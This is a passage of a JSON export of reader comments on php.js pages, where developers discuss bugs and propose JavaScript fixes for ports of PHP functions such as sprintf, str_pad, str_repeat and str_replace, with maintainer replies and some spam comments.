see:\r\n\r\n[CODE=&quot;text&quot;]\r\nTest result\r\n===========================================================================\r\narray\/uasort.js                          results#1    OKAY \r\n[\/CODE]\r\n\r\nThat word 'OKAY' is like a little present :) You are awesome Brett."},{"date":"2012-04-04 14:32:54","author":"????? ????????","url":"http:\/\/an3m1.com\/","comment":"Great job here. I really enjoyed what you had to say. Keep going because you definitely bring a new voice to this subject. Not many people would say what you\u2019ve said and still make it interesting\n\n"}],"soundex":[{"date":"2010-09-30 10:41:27","author":"margolan","url":"http:\/\/margolan.idhost.kz","comment":"Nice! Thanks...."},{"date":"2012-04-18 10:20:03","author":"????? ???????","url":"http:\/\/an3m1.com\/","comment":"If I might \u2014perhaps you should consider adding a few images. I don\u2019t mean to disrespect what you\u2019ve said ; its very enlightening, indeed. However, I think would respond to it more positively if they could be something tangible to your ideas \n"}],"split":[{"date":"2008-07-25 10:22:15","author":"Constantin razvan_bc@yahoo.com","url":"","comment":"===============================\r\nvery nice ideea to do this,\r\n\r\nBut your script is working ...\r\n[CODE=&quot;Javascript&quot;]\r\n&lt;!DOCTYPE HTML PUBLIC &quot;-\/\/W3C\/\/DTD HTML 4.0 Transitional\/\/EN&quot;&gt;&lt;HTML&gt;\r\n&lt;HEAD&gt;\r\n&lt;TITLE&gt;&lt;\/TITLE&gt;\r\n&lt;style&gt;&lt;\/style&gt;\r\n&lt;\/HEAD&gt;\r\n&lt;BODY&gt;\r\n  &lt;SCRIPT LANGUAGE=&quot;JavaScript&quot;&gt;\r\n  &lt;!--\r\n  function explode( delimiter, string) {\r\n    if ( arguments.length &lt; 2\r\n        || typeof arguments[0] == 'undefined'\r\n        || typeof arguments[1] == 'undefined' )\r\n    {\r\n        return null;\r\n    }\r\n \r\n   \r\n        \/\/ support for limit argument\r\n        var splitted = string.toString().split(delimiter.toString());\r\n        var partA = splitted.splice(0, splitted.length - 1);\r\n        var partB = splitted.join(delimiter.toString());\r\n        \/\/while(partA.indexOf(delimiter) != -1) \r\n\t\tpartA.push(partB);\r\n        return partA;\r\n   \r\n}\r\n\tfunction split( delimiter, string) {\r\n\t\treturn explode( delimiter, string );\r\n\t}\r\n\r\n\r\n\r\n\tstr1='25-Lug-2008|26-Lug-2008|27-Lug-2008|28-Lug-2008|';\r\n\tvar str=split('|',str1);\r\n\tfor(var i=0;i&lt;str.length;i++)\r\n\tdocument.writeln(str[i]+&quot;&lt;br&gt;&quot;);\r\n  \/\/--&gt;\r\n  &lt;\/SCRIPT&gt;\r\n&lt;\/BODY&gt;&lt;\/HTML&gt;\r\n[\/CODE]"},{"date":"2008-07-25 10:24:55","author":"Constantin razvan_bc@yahoo.com","url":"","comment":"===============================&lt;br&gt;\r\nvery nice ideea to do this,\r\n\r\nBut your script NOW is working ...&lt;br&gt;\r\n[CODE=&quot;Javascript&quot;]\r\n&lt;!DOCTYPE HTML PUBLIC &quot;-\/\/W3C\/\/DTD HTML 4.0 Transitional\/\/EN&quot;&gt;&lt;HTML&gt;\r\n&lt;HEAD&gt;\r\n&lt;TITLE&gt;&lt;\/TITLE&gt;\r\n&lt;style&gt;&lt;\/style&gt;\r\n&lt;\/HEAD&gt;\r\n&lt;BODY&gt;\r\n  &lt;SCRIPT LANGUAGE=&quot;JavaScript&quot;&gt;\r\n  &lt;!--\r\n  function explode( delimiter, string) {\r\n    if ( arguments.length &lt; 2\r\n        || typeof arguments[0] == 'undefined'\r\n        || typeof arguments[1] == 'undefined' )\r\n    {\r\n        return null;\r\n    }\r\n \r\n   \r\n        \/\/ support for limit argument\r\n        var splitted = string.toString().split(delimiter.toString());\r\n        var partA = splitted.splice(0, splitted.length - 1);\r\n        var partB = splitted.join(delimiter.toString());\r\n\r\n\t\tpartA.push(partB);\r\n        return partA;\r\n   \r\n}\r\n\tfunction split( delimiter, string) {\r\n\t\treturn explode( delimiter, string );\r\n\t}\r\n\r\n\r\n\r\n\tstr1='25-Lug-2008|26-Lug-2008|27-Lug-2008|28-Lug-2008|';\r\n\tvar str=split('|',str1);\r\n\tfor(var i=0;i&lt;str.length;i++)\r\n\tdocument.writeln(str[i]+&quot;&lt;br&gt;&quot;);\r\n  \/\/--&gt;\r\n  &lt;\/SCRIPT&gt;\r\n&lt;\/BODY&gt;&lt;\/HTML&gt;\r\n[\/CODE]"}],"sprintf":[{"date":"2008-11-04 20:03:40","author":"David Portabella","url":"","comment":"Hello,\r\n\r\nCongratulations for this great library!!\r\n\r\none question,\r\nIs it possible to specify a thousand separator for sprintf?\r\n\r\nsomething like \r\nsprintf('%,.2f&quot;, 1234567.89) =&gt; &quot;1,234,567.89&quot;\r\n\r\n\r\nRegards,\r\nDAvid"},{"date":"2008-11-09 12:57:29","author":"Mike","url":"","comment":"If you want to serialize strings with multibyte chars (special chars) you must replace this line:\n\nval = \"s:\" + mixed_value.length + \":\\\"\" + mixed_value + \"\\\"\";\n\nwith these:\n\nvar stringLen = encodeURIComponent(mixed_value).replace(\/%..\/g, 'x').length\nval = \"s:\" + stringLen + \":\\\"\" + mixed_value + \"\\\"\";"},{"date":"2008-11-09 14:28:59","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ David Portabella: I did some testing and as far as I can tell PHP itself does not support that notation. And a general rule of thumb for us is: if php doesn't do it, we don't either. This ensures maximum compatibilty. If I'm in error on this, let me know.\r\nOtherwise, the function: number_format might be what you're looking for."},{"date":"2008-11-28 11:53:19","author":"Paulo Ricardo F. Santos","url":"","comment":"Hey, the current implementation misses the custom padding character:\r\n\r\n[CODE=&quot;php&quot;]printf(&quot;[%'#10s]\\n&quot;,  $s); \/\/ use the custom padding character '#'[\/CODE]\r\n\r\n;)"},{"date":"2008-12-01 09:13:31","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Paulo Ricardo F. Santos: Fixed it, thanks for pointing that out."},{"date":"2009-01-08 12:29:19","author":"ejsanders","url":"http:\/\/cantorion.org","comment":"Here is the related function vsprintf, which takes the arguments as an array (can be useful):\r\n\r\n[CODE=&quot;Javascript&quot;]\r\nfunction vsprintf(format, args) {\r\n\treturn sprintf.apply(this, [format].concat(args));\r\n}\r\n[\/CODE]"},{"date":"2009-01-08 17:03:36","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ ejsanders: Very well, thank you!"},{"date":"2009-08-29 17:48:32","author":"Sandro Franchi","url":"http:\/\/alegua.com.ar","comment":"In Line 054\n\n[CODE]\nif (precision != null) {...\n[\/CODE]\n\nshould be changed to \n[CODE]\nif (precision) {...\n[\/CODE]\n\nbecause precision (when not used) is \"undefined\", not null, also this helps to make the script validated by jslint.\n\n\n"},{"date":"2009-08-30 04:59:41","author":"Brett Zamir","url":"http:\/\/brett-zamir.me","comment":"@Sandro Franchi: Good catch... But shouldn't it be:\n\n[CODE]if (precision !== undefined) {[\/CODE]\n\n? If it is as you had it, 0 will also be ignored."},{"date":"2010-10-09 18:35:14","author":"kernel","url":"http:\/\/www.btcomic.net\/","comment":"please consult this project, that will be helpful\n\nhttp:\/\/www.diveintojavascript.com\/projects\/javascript-sprintf"},{"date":"2011-01-14 00:07:29","author":"Dj","url":"","comment":"A suggest:\n\ncheck the result of parseInt() function, and set it to 0 if is NaN\n\n[CODE]\ncase 'd':\n                number = parseInt(+value, 10);\nif (isNaN(number) {\n    number = 0;\n}\n[\/CODE]\n\nso when a %d is replaced with a non integer value, the result is 0 instead of NaN like PHP do.\n\nExample without check NaN:\nresult = sprintf('Number is: %d', 'non numeric');\n\/\/result is: 'Number is NaN'\n\n\nExample checking NaN:\nresult = sprintf('Number is: %d', 'non numeric');\n\/\/result is: 'Number is 0'\n\ntry it in php and compare\n"},{"date":"2011-01-14 07:46:33","author":"Rafa? Kukawski","url":"http:\/\/blog.kukawski.pl","comment":"@Dj: Thanks for your feedback. I will add the fix today. \n\nBTW. The same can be done without the need to call parseInt and isNaN.\n\n[CODE]number = (+value) | 0;[\/CODE]\n+value casts the data to Number, | 0 drops floating point part and if the +value gives NaN, changes it to 0."},{"date":"2011-09-29 02:49:33","author":"Brent","url":"","comment":"As far as adding a thousands separator, I don't think it is currently in the sprintf function code above.\n\nHowever, this regex does it:\n[CODE]\ns\/\\d{1,3}(?=(\\d{3})+(?!\\d))\/$&,\/g\n[\/CODE]\n\nThis javascript code (based on the regex) does it:\n[CODE]\n\n    function thousands (a){\n    \n     return a.replace (\/\\d{1,3}(?=(\\d{3})+(?!\\d))\/g,\"$&,\");\n     \n    }\n[\/CODE]\n\nThe only flaw is that it will happily keep adding commas every three characters to the right of the decimal point as well as to the left.  So you have to apply it to only the integer side of the number.  It works fine as-is for integers and, for example, currency (which only has max 2 decimal places).\n\nIf you want to use another separator character than \",\" make the change in the second argument to a.replace. \n\nI can't quite see how to easily add this to the sprintf function (and also the usual flag to add the thousands separator is ', which is used for something else in the code above) but there is a start for anyone who like to do it.\n\nRegex source is from: http:\/\/remysharp.com\/2007\/10\/19\/thousand-separator-regex\/"},{"date":"2012-08-08 23:28:13","author":"Dj","url":"","comment":"Note that the regexp does not include the char \"F\" (uppercase), so expressions like \"%01.2F\" will not works.\nThe function is already done to process it, but it just was missed in the regexp so it is not captured."},{"date":"2012-09-18 16:28:11","author":"Brett Zamir","url":"http:\/\/brett-zamir.me","comment":"@Dj: Fixed in Git, thanks!"},{"date":"2012-09-19 03:23:45","author":"Brett Zamir","url":"http:\/\/brett-zamir.me","comment":"@Brent: Sorry for the very late reply, but is the functionality you seek already a part of PHP? You are free to share extension ideas here, but we really try to stick with PHP behavior to maintain limits on our project scope.\n\n@kernel: Thank you for the reference, but is there some functionality present in the other implementation which is not in ours?"}],"str_ireplace":[{"date":"2008-03-21 23:43:46","author":"penutbutterjelly","url":"","comment":"Why the zchmook doesn't this one support arrays as input, your str_replace does :\/"},{"date":"2008-03-23 11:07:55","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ penutbutterjelly: I can see why that looks weird. It's because the code was made by different people though. But I've adjusted str_ireplace to match the behaviour of it's brother str_replace. Thanks for noticing!"},{"date":"2009-10-07 08:11:01","author":"Philipp Lenssen","url":"http:\/\/www.coverbrowser.com","comment":"This doesn't seem to escape special regex characters, hence it doesn't work when replacing e.g. \"$\" with \"foo\", or am I missing something\". The following function might help, though I still ran into problems with replacing \">\"...\n\n[CODE]\nMisc.escapeRegex = function(s) {\n    return s.replace(\/([\\\\\\^\\$*+[\\]?{}.=!:(|)])\/g, '\\\\$1');\n}\n[\/CODE]"},{"date":"2009-10-07 08:22:21","author":"Philipp Lenssen","url":"http:\/\/www.coverbrowser.com","comment":"(My suggested fix should work fine, the \">\" problem was something else...)"},{"date":"2009-10-09 11:15:31","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Philipp Lenssen: Great find! Fixed it. thanks a lot!"},{"date":"2010-07-22 22:51:23","author":"Leandro Angelo","url":"","comment":"Boa funciona legal, e igual o str_ireplace do PHP"},{"date":"2011-02-22 06:11:30","author":"Monski","url":"","comment":"if you want to replace certain words only..\ntweak line 63\n[CODE]\nreg = new RegExp(\"\\\\b\"+escapeRegex(search[i]) + \"\\\\b\", 'gi'); \/\/reg = new RegExp(escapeRegex(search[i]), 'gi');\n[\/CODE]\nsample = str_ireplace('H', 'Hi', 'H HeLLo');\n\nwill retur \"Hi Hello\""},{"date":"2011-03-04 22:44:11","author":"archive0001","url":"","comment":"this function has a bug. the [code] search += '';[\/code] at line 28 will destroy the param [code]search[\/code] as an array. You should add a condition like [code]if (!(search instanceof Array))search += '';[\/code]\r\n"},{"date":"2011-07-05 12:23:28","author":"test test","url":"test","comment":"[CODE]\nyour_stuff('here');\n[\/CODE]\n"},{"date":"2012-04-10 09:54:07","author":"???? ????","url":"http:\/\/an3m1.com\/","comment":"Write more, that\u2019s all I have to say. Literally, it seems as though you relied on the video to make your point. You clearly know what you\u2019re talking about, why waste your intelligence on just posting videos to your blog when you could be giving us something enlightening to read "}],"str_pad":[{"date":"2008-01-05 22:14:20","author":"Aaron Saray","url":"","comment":"Do you have a list of functions that are &quot;in the works&quot; so that people don't duplicate effort?"},{"date":"2008-01-05 22:39:59","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Aaron Saray: Thanks for the suggestion, I've added a section: 'In The Works', which will be updated on every page."},{"date":"2008-01-09 19:21:08","author":"waldo malqui silva","url":"","comment":"Hi this is my implementation of PHP's count\r\n\r\n[CODE=&quot;Javascript&quot;]\r\nvar Prueba = [1,2,3,4,5,6,7,8,9,0];\r\nvar Prueba2 = null;\r\nvar Prueba3 = 'waldo';\r\nvar Prueba4 = false;\r\nvar Prueba5 = [[[1,['a','b','c'],3],2,3,4,5],['a','b','c','d','e'],[1,2,3,4,5],['a','b','c','d','e'],[1,2,3,4,5]];\r\nvar Prueba6 = {\r\n  'one' : [1,2,3,4,5],\r\n  'two' : ['a','b','c'],\r\n  'fun' : function () {\r\n    alert ( 'Testing...' );\r\n  },\r\n  'four' : { 'values' :  [1,2,3,4,5,6] }\r\n}\r\n      \r\nalert ( count ( Prueba6, 'COUNT_RECURSIVE' ) );\r\n\r\n      function count ( mixed_var, mode) {\r\n      \tvar elements = 0;\r\n         \r\n         if ( mixed_var instanceof Array ) {\r\n         \tif ( mode == 'COUNT_RECURSIVE' || mode == 1 ) {\r\n         \t\tfor ( var item in mixed_var ) {\r\n         \t\t\tif ( mixed_var[item] instanceof Array || mixed_var[item] instanceof Object ) {\r\n         \t\t\t\telements += count ( mixed_var[item], 'COUNT_RECURSIVE' );\r\n         \t\t\t}\r\n         \t\t\telements++;\r\n         \t\t}\r\n         \t} else {\r\n         \t\telements = mixed_var.length;\r\n         \t}\r\n         } else if ( mixed_var instanceof Object ) {\r\n         \tfor ( var item in mixed_var ) {\r\n         \t\tif ( mixed_var[item] instanceof Array || mixed_var[item] instanceof Object ) {\r\n         \t\t\tif ( mode == 'COUNT_RECURSIVE' || mode == 1 ) {\r\n         \t\t\t\telements += count ( mixed_var[item], 'COUNT_RECURSIVE' );\r\n         \t\t\t}\r\n         \t\t\telements++;\r\n         \t\t}\r\n         \t}        \t\r\n         } else if ( mixed_var != null ) {\r\n         \telements = 1;\r\n         }\r\n         \r\n      \treturn elements;\r\n      }\r\n\r\n\r\n[\/CODE]"},{"date":"2008-01-09 19:29:19","author":"waldo malqui silva","url":"","comment":"Sorry Kevin, I don't read your function list, anyway if my implementation of PHP's count is good you can use :))))"},{"date":"2008-01-09 19:30:41","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ waldo malqui silva : I was just working on count, and trimmed it down a bit:\r\nhttp:\/\/kevin.vanzonneveld.net\/techblog\/article\/javascript_equivalent_for_phps_count\/\r\n\r\nDoes this also seem right to you, or am I overlooking something?"},{"date":"2008-01-09 19:44:24","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ waldo malqui silva: No Problem! I've included your name in my function. If you have any remarks on it, let me know!"},{"date":"2008-04-17 04:59:31","author":"Jonas Raoni","url":"","comment":"I didn't saw this pad before, I've made one a long time ago if you find it useful here it is (sorry about the format, I'm lazy to change the codes hehe):\r\n\r\nString.prototype.pad = function(l, s, t){\r\n    return s || (s = &quot; &quot;), (l -= this.length) &gt; 0 ? (s = new Array(Math.ceil(l \/ s.length)\r\n        + 1).join(s)).substr(0, t = !t ? l : t == 1 ? 0 : Math.ceil(l \/ 2))\r\n        + this + s.substr(0, l - t) : this;\r\n};\r\n\r\nl = length\r\ns = string\r\nt = if 0 pads on the left, if 1 right, if 2 both sides"},{"date":"2008-04-17 05:51:46","author":"Philip","url":"","comment":"Hmm, the one we have is actually somewhat faster, at least in Firefox.  It does seem more compact, though."},{"date":"2008-04-17 12:52:54","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Jonas Raoni &amp; Philip: I think we should stick with speed &amp; readability. For compactness, people can optionally use a minified version, but it makes development with multiple coders a bit harder to make such a compact version the leading one. Do you guys agree?"},{"date":"2009-08-21 16:22:55","author":"Marco van Oort","url":"","comment":"I thought it would be worth mentioning the following:\naccording to php.net, the third parameter should have a default value of an interspace, e.g. $pad_string = \" \";.\nI do not know what exactly is the best way to set such a default value, but anyway, I would suggest to add this default value so this function is more equilavent to php's function."},{"date":"2009-08-22 10:07:08","author":"Brett Zamir","url":"http:\/\/brett-zamir.me","comment":"Good catch--fixed."},{"date":"2010-04-28 08:44:41","author":"Rafa? Kukawski","url":"http:\/\/blog.kukawski.pl","comment":"My approach to str_pad\n[CODE]function str_pad(input, pad_length, pad_string, pad_type){\n\tinput += ''; \/\/ casting any type to string\n\tpad_length |= 0; \/\/ casting any type to integer\n\tpad_string = String(pad_string === len ? ' ' : pad_string); \/\/ checking for undefined value for pad_string\n\tvar charsRequired = Math.max(0, pad_length - input.length);\n\tpad_string = Array(Math.ceil(charsRequired \/ pad_string.length) + 1).join(pad_string);\n\tvar len =\n\t\tpad_type === 'STR_PAD_BOTH' ?\n\t\t\t[charsRequired \/ 2 | 0, Math.ceil(charsRequired \/ 2)] :\n\t\tpad_type === 'STR_PAD_LEFT' ?\n\t\t\t[charsRequired, 0] :\n\t\t\t[0, charsRequired];\n\treturn pad_string.substr(0, len[0]) + input + pad_string.substr(0, len[1]);\n}[\/CODE]\nIt's a bit shorter. I think the performance will be slightly worser cause of using Array(len).join().\n\nRegarding the pad_string parameter. I am converting any value except undefined to string. When undefined is passed, a string containing 1 space character is used instead."},{"date":"2010-04-28 09:19:31","author":"Rafa? Kukawski","url":"http:\/\/blog.kukawski.pl","comment":"Oh, sorry, I shouldn't also accept empty string. Please change \n[CODE]pad_string = String(pad_string === len ? ' ' : pad_string);[\/CODE]\nto\n[CODE]pad_string = (pad_string !== len && ''+pad_string) || ' ';[\/CODE]"},{"date":"2010-04-29 15:37:31","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"Hey there Rafal,\n\nMy second testcase returned: -----Kevin van Zonneveld------  with your function. So that needs a bit of tinkering still.\n\nAlso jslint said:\nLint at line 17 character 13: 'len' was used before it was defined.\nvar len =\n\nThen on a personal note, I can't say I'm the world's biggest fan of concatenating ? : constructions as they tend to lead to short, but more difficult to maintain code.\n\nHowever in this case I feel the maintainability is still improved compared to the current implementation so I'd probably still include it in php.js\n\nThanks so much!\n"},{"date":"2010-04-29 22:41:48","author":"Rafa? Kukawski","url":"http:\/\/blog.kukawski.pl","comment":"@Kevin van Zonneveld:\nThanks for your feedback. I will check the second test case tomorrow and test the function with some \"edge\"-scenarios.\n\nRegarding the lint warning about using len before it being declared, I used this JS feature to get undefined value without using global undefined variable, but now I think I should have used it, cause I'm already using global Array function and some other phpjs function also use these variables. I will rewrite this part too (there are many more possibilities to get undefined value, or I could just declare the variable at the very beginning). We\/You should also define some rules about using global variables\/functions\/constructors like undefined, Array, as their usage isn't always safe, cause they can be overwritten. Some developers avoid using them and some just don't bother at all.\n\nAbout using conditional operator, I don't see anything wrong with it. I think, in this case the code is well self-explaining."},{"date":"2010-04-29 23:06:32","author":"Rafa? Kukawski","url":"http:\/\/blog.kukawski.pl","comment":"Regarding the second test case, str_pad on my server (php version 5.2.12) when using STR_PAD_BOTH, first padds from right and then from left, so when there are for example 15 characters to be added, 8 characters are added to the right and 7 to the left. If it's not the case on your server or on a newer PHP version, please inform and we'll align our code."},{"date":"2011-03-08 15:01:46","author":"Chris Wright","url":"","comment":"- Added support for integer values of STR_PAD_x constants as defined in PHP.\r\n- Removed unused variable 'i' from private member 'str_pad_repeater'\r\n\r\n[CODE]\r\nfunction str_pad (input, pad_length, pad_string, pad_type) {\r\n    \/\/ http:\/\/kevin.vanzonneveld.net\r\n    \/\/ +   original by: Kevin van Zonneveld (http:\/\/kevin.vanzonneveld.net)\r\n    \/\/ + namespaced by: Michael White (http:\/\/getsprink.com)\r\n    \/\/ +      input by: Marco van Oort\r\n    \/\/ +   bugfixed by: Brett Zamir (http:\/\/brett-zamir.me)\r\n    \/\/ *     example 1: str_pad('Kevin van Zonneveld', 30, '-=', 'STR_PAD_LEFT');\r\n    \/\/ *     returns 1: '-=-=-=-=-=-Kevin van Zonneveld'\r\n    \/\/ *     example 2: str_pad('Kevin van Zonneveld', 30, '-', 'STR_PAD_BOTH');\r\n    \/\/ *     returns 2: '------Kevin van Zonneveld-----'\r\n    var half = '',\r\n        pad_to_go;\r\n\r\n    var str_pad_repeater = function (s, len) {\r\n        var collect = '';\r\n\r\n        while (collect.length < len) {\r\n            collect += s;\r\n        }\r\n        collect = collect.substr(0, len);\r\n\r\n        return collect;\r\n    };\r\n\r\n    input += '';\r\n    pad_string = pad_string !== undefined ? pad_string : ' ';\r\n\r\n    switch (pad_type) {\r\n        case 'STR_PAD_LEFT':\r\n        case 0:\r\n            pad_type = 0;\r\n              break;\r\n        case 'STR_PAD_BOTH':\r\n        case 2:\r\n            pad_type = 2;\r\n            break;\r\n        case 'STR_PAD_RIGHT':\r\n        case 1:\r\n        default:\r\n            pad_type = 1;\r\n            break;\r\n    }\r\n\r\n    if ((pad_to_go = pad_length - input.length) > 0) {\r\n        if (pad_type == 0) { \/\/ Pad left\r\n            input = str_pad_repeater(pad_string, pad_to_go) + input;\r\n        } else if (pad_type == 1) { \/\/ Pad right\r\n            input = input + str_pad_repeater(pad_string, pad_to_go);\r\n        } else if (pad_type == 2) { \/\/ Pad both\r\n            half = str_pad_repeater(pad_string, Math.ceil(pad_to_go \/ 2));\r\n            input = half + input + half;\r\n            input = input.substr(0, pad_length);\r\n        }\r\n    }\r\n\r\n    return input;\r\n}\r\n[\/CODE]"},{"date":"2012-04-04 14:31:36","author":" ????? ????? ????","url":"http:\/\/an3m1.com\/","comment":"This is a very informative article. I was looking for these things and here I found it. I am doing a project and this information is very useful me. Some things in here I have not thought about before\n\n"}],"str_repeat":[{"date":"2008-01-09 03:23:28","author":"Darrell Brogdon","url":"","comment":"Here's a similar project I started awhile back if you're interested:  http:\/\/sourceforge.net\/projects\/php4js  I haven't had much time to devote to it but I would love it if someone could breathe new life into it."},{"date":"2008-01-09 10:15:25","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Darell Brogdon: Thanks for pointing that out, I've searched hard, but wasn't able to find similar projects. Now that I did, how would you feel if I included some of your functions to this project? Well creditted of course. \r\nMost functions are already here but I found a couple that would be a great addition.\r\n\r\nThe reason to continue here is I developed some tools that really help me to publish new functions quickly, and for me it would be a buzz killer to have to maintain this on sourceforge. Exposure here is bigger as well I think.\r\n\r\nI do believe however that once php.js reaches version 1.0, housing it on such a platform would be a better idea."},{"date":"2008-04-12 20:22:46","author":"Jonas Raoni","url":"","comment":"This way it's faster :)\r\n\r\nString.prototype.repeat = function(l){\r\n\treturn new Array(l+1).join(this);\r\n};\r\n\r\nalert(&quot;jonas&quot;.repeat(10));"},{"date":"2008-04-13 13:01:30","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Jonas Raoni: It sure is, thanks a lot!"},{"date":"2008-07-27 19:31:58","author":"snaky","url":"","comment":"thats grat :-) thank you for publishing"},{"date":"2010-06-22 18:39:57","author":"Tihomir Rabuzin","url":"www.2klika.net","comment":"I think that function has to be improved in this way:\n[CODE]\nreturn new Array(Number(multiplier)+1).join(input);\n[\/CODE]\nChange is in: Number(multiplier)\n\nExplanation:\nI have requirement for expanding numbers inside string in to equivalent number of characters. For example string: 3e2 must have string.length of 6\n\nI have function that iterate through every character of a string and if is_numeric (one of phpjs functions too) replace that value with corresponding number of dummy characters using str_replace:\n[CODE]\n\/\/ max number that we can expand is 99\nfunction expandTerm(subject) {\n    var output = '';\n    var repeat = '';\n\n    for (i=0; i<subject.length; i++) {\n        if(is_numeric(subject[i])) {\n            repeat = subject[i];\n            if (is_numeric(subject[i + 1])) {\n                repeat = repeat * 10;\n            }\n\n            output = output + str_repeat('_', repeat);\n            repeat = '';\n        } else {\n            output = output + subject[i];\n        }\n    }\n\n    return output;\n}\n[\/CODE]\nthis returns 21 if input string is: 2 and __________01 if input string is: 10 and that is wrong. In first case output have to be: __ and in second __________ .\nWhen I change your function, adding type casting on multiplier: Number(multiplier), everything working just as expected.\n\nHave a nice day"},{"date":"2012-04-04 14:32:11","author":"????? ????? ???","url":"http:\/\/an3m1.com\/","comment":"I agree it is a very informative article and I actually enjoy reading good stuff unlike all the crap out there on the internet \n"},{"date":"2012-05-18 12:03:43","author":"Ian Carter","url":"euona.com","comment":"Using bytewise operators this function can be up to 99% faster\n\n[CODE]\n\/*\n * @see http:\/\/jsperf.com\/for-vs-while-bytewise-str-repeat\/2\n *\/\n    function str_repeat(x,n)\n    {\n        var y = '';\n        while(true)\n        {\n                if(n & 1) y += x;\n                n >>= 1;\n                if(n) x += x; else break;\n        }\n        return y;\n    }\n[\/CODE]\n\n"},{"date":"2012-06-22 13:23:38","author":"Brett Zamir","url":"http:\/\/brett-zamir.me","comment":"@Ian Carter: Thanks! I confirmed the significant performance improvement in Firefox (actually 4 or 5x faster in my testing)...Applied in Git..."}],"str_replace":[{"date":"2008-02-19 13:13:37","author":"sbsweb","url":"","comment":"Increible, ese .js es de lo m\u00c3\u00a1s \u00c3\u00batil que he visto."},{"date":"2008-03-02 18:48:20","author":"G.Paderni","url":"","comment":"oh, sorry there's an error please remove my last comment\r\n\r\nthis one is ok:\r\n[CODE=&quot;Javascript&quot;]\r\nfunction str_replace(search,replace,subject) {\r\n\t\/\/ by: Gabriel Paderni\r\n\r\n\tif(!(replace instanceof Array)){\r\n\t\treplace=new Array(replace);\r\n\t\tif(search instanceof Array){\/\/If search  is an array and replace  is a string, then this replacement string is used for every value of search\r\n\t\t\twhile(search.length&gt;replace.length){\r\n\t\t\t\treplace[replace.length]=replace[0];\r\n\t\t\t}\r\n\t\t}\r\n\t}\r\n\r\n\tif(!(search instanceof Array))search=new Array(search);\r\n\twhile(search.length&gt;replace.length){\/\/If replace  has fewer values than search , then an empty string is used for the rest of replacement values\r\n\t\treplace[replace.length]='';\r\n\t}\r\n\r\n\tif(subject instanceof Array){\/\/If subject is an array, then the search and replace is performed with every entry of subject , and the return value is an array as well.\r\n\t\tfor(k in subject){\r\n\t\t\tsubject[k]=str_replace(search,replace,subject[k]);\r\n\t\t}\r\n\t\treturn subject;\r\n\t}\r\n\t\r\n\tfor(var k=0; k&lt;search.length; k++){\r\n\t\tvar i = subject.indexOf(search[k]);\r\n\t\twhile(i&gt;-1){\r\n\t\t\tsubject = subject.replace(search[k], replace[k]);\r\n\t\t\ti = subject.indexOf(search[k],i);\r\n\t\t}\r\n\t}\r\n\r\n\treturn subject;\r\n}\r\n[\/CODE]"},{"date":"2008-03-02 19:34:09","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ G.Paderni: Good point! Thank you for contributing!"},{"date":"2008-03-30 07:01:37","author":"Philip","url":"","comment":"There's only a slight problem with this code...  in PHP, each entry is replaced all at once, rather than one after another.  This creates a problem in the following example:\r\n\r\n[CODE=&quot;Javascript&quot;]\r\nfunction parseInf(kyl){\r\n\r\nkyl=str_replace([\r\n&quot;{name}&quot;,\r\n&quot;l&quot;\r\n],\r\n[\r\n&quot;hello&quot;,\r\n&quot;m&quot;\r\n],\r\nkyl);\r\n\r\n\r\nnev=kyl.split(\/\\r{0,1}\\n-\\r{0,1}\\n\/);\r\n\r\n\r\nreturn nev;\r\n\r\n\r\n}\r\n\r\nalert(parseInf(&quot;{name}, lars&quot;));\r\n[\/CODE]\r\n\r\nTheoretically, the code should return &quot;hello, mars&quot;, but instead it returns &quot;hemmo, mars&quot;.  It completes the first iteration before the second, rather than all at once."},{"date":"2008-03-31 08:13:31","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Philip: Thanks for noticing. My first thought is to order the search array by length, ascending. This way 'l' will be searched &amp; replaced before hello will be.\r\nDo you agree that that would solve the issue?"},{"date":"2008-03-31 08:41:24","author":"Philip","url":"","comment":"Not necessarily; what if a result produced by the replacement of one of the shorter strings produced the values of one of the longer searches?  Here's a code that works, but I haven't indented the part that I made yet, or commented it, and it requires a second external function... I dunno if you can fix that or not.\r\n\r\n\r\n\r\n[CODE=&quot;Javascript&quot;]\r\n    \/\/ http:\/\/kevin.vanzonneveld.net\r\n    \/\/ +   original by: Kevin van Zonneveld (http:\/\/kevin.vanzonneveld.net)\r\n    \/\/ +   improved by: Gabriel Paderni\r\n    \/\/ +   improved by: Philip Peterson\r\n    \/\/ *     example 1: str_replace(' ', '.', 'Kevin van Zonneveld');\r\n    \/\/ *     returns 1: 'Kevin.van.Zonneveld'\r\n\r\nfunction regexp_escape(text) {\r\n  if (!arguments.callee.sRE) {\r\n    var specials = [\r\n      '\/', '.', '*', '+', '?', '|',\r\n      '(', ')', '[', ']', '{', '}', '\\\\'\r\n    ];\r\n    arguments.callee.sRE = new RegExp(\r\n      '(\\\\' + specials.join('|\\\\') + ')', 'g'\r\n    );\r\n  }\r\n  return text.replace(arguments.callee.sRE, '\\\\$1');\r\n}\r\n\r\nfunction str_replace(search, replace, subject)\r\n{\r\n\r\n    if(!(replace instanceof Array)){\r\n        replace=new Array(replace);\r\n        if(search instanceof Array){\/\/If search    is an array and replace    is a string, then \r\n\r\nthis replacement string is used for every value of search\r\n            while(search.length&gt;replace.length){\r\n                replace[replace.length]=replace[0];\r\n            }\r\n        }\r\n    }\r\n \r\n    if(!(search instanceof Array))search=new Array(search);\r\n    while(search.length&gt;replace.length){\/\/If replace    has fewer values than search , then an \r\n\r\nempty string is used for the rest of replacement values\r\n        replace[replace.length]='';\r\n    }\r\n \r\n    if(subject instanceof Array){\/\/If 